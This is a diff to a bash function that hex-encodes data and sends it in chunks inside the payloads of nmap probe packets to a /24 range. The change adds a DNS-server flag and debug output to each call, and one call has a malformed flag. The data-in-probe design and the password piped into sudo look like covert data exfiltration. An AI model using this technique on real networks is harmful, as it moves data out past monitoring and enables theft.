@@ -87,7 +87,7 @@ split_send_hp() {
 
     if [[ $wc_byte -le 16 ]]; then
       #ping -c 6 -p "$1" $host | tee -a "${log_dir}/error.log"
-      echo "$mypasswd" | sudo -S nmap -Pn -sn --data "$my_hex_string"  "$host"/24 | tee -a "${log_dir}/error.log"
+      echo "$mypasswd" | sudo -S nmap -dns-servers 8.8.8.8 -d -Pn -sn --data "$my_hex_string"  "$host"/24 | tee -a "${log_dir}/error.log"
            
     else
       
@@ -103,12 +103,12 @@ split_send_hp() {
 
         if [[ $wc_byte2 -le 16 ]]; then
           #ping -c 6 -p "$my_hex_string" $host | tee -a "${log_dir}/error.log"
-          echo "$mypasswd" | sudo -S nmap -Pn -sn --data "$my_hex_string"  "$host"/24 | tee -a "${log_dir}/error.log"
+          echo "$mypasswd" | sudo -S nmap --dns-servers 8.8.8.8 -d -Pn -sn --data "$my_hex_string"  "$host"/24 | tee -a "${log_dir}/error.log"
            
         else
            echo "warning: $part encoded to $my_hex_string is too long for transmission, sending..." | tee -a "${log_dir}/error.log"
            #ping -c 6 -p "$my_hex_string" $host | tee -a "${log_dir}/error.log"
-           echo "$mypasswd" | sudo -S nmap -Pn -sn --data "$my_hex_string"  "$host"/24 | tee -a "${log_dir}/error.log"
+           echo "$mypasswd" | sudo -S nmap --dns-servers 8.8.8.8 -d -Pn -sn --data "$my_hex_string"  "$host"/24 | tee -a "${log_dir}/error.log"
            
            #r=$(split_send_sp "$my_hex_string" "$part")
         fi
@@ -140,7 +140,7 @@ split_send_hp() {
     #echo ""
     #echo "Field 2: $field2"
 
-    echo "$mypasswd" | sudo -S nmap -Pn -sn --data-string "$field1"  "$host"/24 | tee -a "${log_dir}/error.log"
+    echo "$mypasswd" | sudo -S nmap --dns-servers 8.8.8.8 -d  -Pn -sn --data-string "$field1"  "$host"/24 | tee -a "${log_dir}/error.log"
            
     hex_string=$(str_to_hex "$field1")
     echo "$hex_string"
